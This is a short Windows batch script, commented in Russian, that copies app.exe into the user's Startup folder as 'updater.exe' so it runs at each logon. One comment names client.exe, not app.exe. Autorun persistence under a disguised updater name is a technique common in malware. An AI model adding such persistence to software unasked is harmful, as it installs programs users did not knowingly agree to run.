@echo off
REM Получаем путь к папке автозагрузки текущего пользователя
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Копируем client.exe в автозагрузку как updater.exe
copy "%~dp0app.exe" "%startup%\updater.exe"

echo Файл скопирован в автозагрузку.
pause
